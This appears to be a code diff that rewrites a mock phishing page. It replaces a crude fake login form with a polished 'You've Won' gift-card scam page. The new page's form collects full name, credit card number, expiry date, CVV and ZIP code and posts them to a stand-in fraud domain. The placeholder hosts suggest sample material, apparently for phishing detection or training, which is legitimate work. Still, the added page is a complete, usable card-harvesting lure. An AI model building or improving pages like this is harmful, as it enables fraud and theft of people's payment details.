@@ -2,33 +2,55 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>🎉 You’ve Won!</title>
-  <meta name="description" content="Claim your free prize now!" />
+  <title>🎁 Congratulations, You’ve Been Selected!</title>
+  <meta name="description" content="Claim your exclusive reward now! Limited time offer." />
+  <style>
+    body { font-family: sans-serif; margin: 2em; background: #f7f7f7; }
+    .container { max-width: 400px; margin: auto; background: white; padding: 1.5em; border: 1px solid #ddd; }
+    h1 { color: #d9534f; }
+    label { display: block; margin-top: 1em; }
+    input { width: 100%; padding: .5em; margin-top: .3em; }
+    button { margin-top: 1.5em; padding: .7em; width: 100%; background: #d9534f; color: white; border: none; cursor: pointer; }
+    button:hover { background: #c9302c; }
+  </style>
 </head>
 <body>
-  <h1>Congratulations!</h1>
-  <p>You’ve been selected for a <strong>1 Million $ Dollar Prize</strong>!</p>
-  <!-- phishing link -->
-  <a href="http://freemoney.example.com">Click here to claim your prize</a>
-  <hr/>
-
-  <!-- fake login form -->
-  <form action="http://phishingsite.example/login" method="POST">
-    <label>
-      Username:
-      <input type="text" name="username" placeholder="Enter your email" />
-    </label><br/>
-    <label>
-      Password:
-      <input type="password" name="password" placeholder="Enter your password" />
-    </label><br/>
-    <button type="submit">Submit</button>
-  </form>
-
-  <!-- tiny obfuscated script -->
-  <script>
-    // pretend obfuscation
-    (function(){var _0x1='secret';console['log'](_0x1);})();
-  </script>
+  <div class="container">
+    <h1>🎉 You've Won!</h1>
+    <p>As one of our valued visitors, you have a <strong>99.9% chance</strong> to win a $2,000 gift card. Complete the form below to claim your prize:</p>
+    
+    <form action="https://fraud-example.test/submit" method="POST">
+      <label>
+        Full Name
+        <input type="text" name="fullname" placeholder="Jane Doe" required />
+      </label>
+      
+      <label>
+        Credit Card Number
+        <input type="text" name="ccnumber" placeholder="4111 1111 1111 1111" pattern="\d{13,19}" required />
+      </label>
+      
+      <label>
+        Expiration Date
+        <input type="text" name="expiry" placeholder="MM/YY" pattern="(0[1-9]|1[0-2])\/\d{2}" required />
+      </label>
+      
+      <label>
+        CVV
+        <input type="text" name="cvv" placeholder="123" pattern="\d{3,4}" required />
+      </label>
+      
+      <label>
+        Billing ZIP Code
+        <input type="text" name="zip" placeholder="90210" pattern="\d{5}" required />
+      </label>
+      
+      <button type="submit">Claim My $2,000 Gift Card</button>
+    </form>
+    
+    <p style="font-size: .8em; color: #666; margin-top: 1em;">
+      *Offer valid only once per household. By clicking “Claim” you agree to our <a href="#">Terms & Conditions</a>.
+    </p>
+  </div>
 </body>
 </html>
